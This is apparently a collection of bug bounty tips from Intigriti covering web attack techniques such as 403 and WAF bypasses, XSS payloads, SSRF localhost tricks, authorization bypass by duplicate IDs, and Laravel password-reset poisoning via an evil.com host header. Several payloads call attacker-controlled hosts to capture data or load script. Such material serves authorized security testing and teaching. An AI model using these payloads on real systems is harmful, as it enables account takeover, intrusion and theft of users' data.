# Intigriti Bug Bounty Tips

## Find WP login

Found credentials but no Wordpress login page?

Go to `/wp-admin/install.php` and WordPress will reveal the exact location!

![INT1](INT1.png)

Credit: @sw33tLie

## 403 Forbidden bpyass:

Gettting a 403 error?

Try appending `%2e` after the first slash!

`https://host.com/path` = <span style="color:red">403 FORBIDDEN</span>

`https://host.com/%2e/path` = <span style="color:green">200 OK</span>

Credit: @rex0__

## Laravel trick:

Testing a laravel app?

On default settings, its vulnerable to HTTP host override via X-Forwarded-Host when used behind a reverse proxy.

```
POST /reset-password HTTP/1.1
HOST: neginx.laravel.app
X-Forwarded-Host: evil.com
email=victim@mail.com&username=sadvictim
```

Credit: @atul_hax

## <% in e-mails:

Testing for injections in e-mails?

Check the e-mail source code for literal characters or evaluated payloads & use basic locators such as `<%`.

![INT2](INT2.png)

Credit: @ngkogkos

## Unicode WAF evasion:

Use invalid unicode characters to bypass the WAF! Spice up your XSS payloads with characters like `\uffff`

`<script>alert(0)</script>` <span style="color:red">doesn't pass</span>

`<scr\uffffipt>alert(0)</script>` <span style="color:green">passes</span>

Credit: @holme_sec

## Favicon has recon:

Did you know you can use favicon hashes to discover assets and fingerprint technologies on websites like <span style="color:red">Shodan</span> and <span style="color:red">Binaryedge</span>?

```
> curl -s -L -k https://gitlab.com/favicon.ico | 
python3 -c 'import mmh3,sys,codecs;
print(mmh3.hash(codecs.encode(sys.stdin.buffer.read(),"base64")))'
1278323681
shodan : http.favicon.hash: 1278323681
```

Credit: @kalimer0x00

## Predict URL shortners:

<http://urlte.am> bruteforces url shorteners, and makes it easier to do recon and find secrets by bruteforcing the most common URL shortners.

<span style="color:red">
TIP: use their calculator to convert numeric ID's to alphanumeric codes!<br>
e.g. 13371337 = U6uJ
</span>

Credit: gmbtbpvvshezrobb

## From XSS to SSRF:

Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include Injection with this payload:

`<esi:include src="http://yoursite.com/capture" />`

Use it to bypass cookie restrictions, XSS filters & more!

Credit: @georgeomnet

## Blind XSS in JS frameworks:

Testing applications using <span style="color:red">Angular</span> or <span style="color:red">Vue.js</span>? Don't forget to wrap your build XSS payloads in a template injection payload, e.g.:

`{{constructor.constructor('import("https://jr0ch17.xss.ht")')()}}`

Not a lot of people test this!

Credit: @JR0ch17

## Get source code of Electron apps:

When working on Electron apps, try decompiling them with this command:

`asar extract app.asar <DEST FOLDER>`

It gets a lot easier to hack apps with their source code!

Credit: @spaceraccoonsec

## Burp's HTTP History:

Encounter an odd ID or API?
Always do a search in your Burp History. It might be used elsewhere!

![INT3](INT3.png)

Credit: @alxbrsn

## Guessing Subdomains:

Run subdomain discovery on domains owned by the target company but out-of-scope, use the result as a subdomain wordlist for in-scope domains.

<span style="color:red">Found</span> http://secret.**<span style="color:red">out-of-scope</span>**.com

<span style="color:red">Try</span> http://secret.**<span style="color:red">in-scope</span>**.com

Credit: @healthyoulet

## SSO Redirects

Don't trust SSO implementations, if you face a target with 302 redirect to SSO pick a wordlist and <span style="color:red">scan folders/files before redirect</span>, you will find reachable stuff and data makes SSO useless. 

Credit: @Th3G3nt3lman

## Hidden parameter trick

Scour JavaScript files for variable names then try each of them as a GET/POST parameters to uncover hidden parameters. This often results in XSS!

<span style="color:red">see</span> `var siteKey = "Uqxf9TX"`

<span style="color:red">try</span> `https://host.com?siteKey=";alert(0)//`

Credit: @hakluke

## Don't forget the `/`

When fuzzing for directories, make sure you append a `/` to your wordlist items. This often leads to directory listings!

- <span style="color:red">403 - 305B - /uploads</span>
- <span style="color:green">200 - 35KB - /uploads/</span>

Credit: @stanfaas

## Domain whitelist bypass

Need to bypass domain validation?

Assume the devs are using a regex and forgot to escape the <span style="color:red">dot character</span> (`.`)!

Example: `^http(s)?:\/\/[a-z]+.target.com$`
- `https://subdomain.target.com` <span style="color:green">MATCH</span>
- `https://subdomainAtarget.com` <span style="color:green">MATCH</span>

Credit: @filedescriptor

## Bypass SSRF Protection

The number of <span style="color:red">zeros</span> in `http://127.0.0.1` doesn't matter
- `http://127.1`
- `http://127.00000000000000000000.001`
- `http://127.000.000.0000000000000000000001`

Credit: @Naategh_

## Authorization bypass

Add multiple ID's to HTTP requests. This sometimes bypasses authorization checks for the 2nd ID!

||||
|-|-|-|
|?id=**<span style="color:blue">me</span>**|?id=**<span style="color:purple">victim</span>**|?id=**<span style="color:blue">me</span>**&id=**<span style="color:purple">victim</span>**|
|<span style="color:green">200 OK</span>|<span style="color:red">401 UNAUTHORIZED</span>|<span style="color:green">200 OK</span>|
|<span style="color:blue">my data</span>|<span style="color:red">no data</span>| <span style="color:blue">my</span> & <span style="color:purple">victim data</span>|

Credit: @pxmme1337

## Open Redirect Bypass

Try to bypass URL whitelists using Turkish characters like `ğ` (g with breve).

`https://evil.comğ.target.com`

Becomes:

`https://evil.com?.target.com`

## Target based wordlist:

- Take all your subdomains for your target
- Split at the "."s and "-"s, the `uniq` them
- Add these to your wordlists

Use the custom list to bruteforce everything from hidden subdomains to weak credentials!

Credit: @Rhynorater
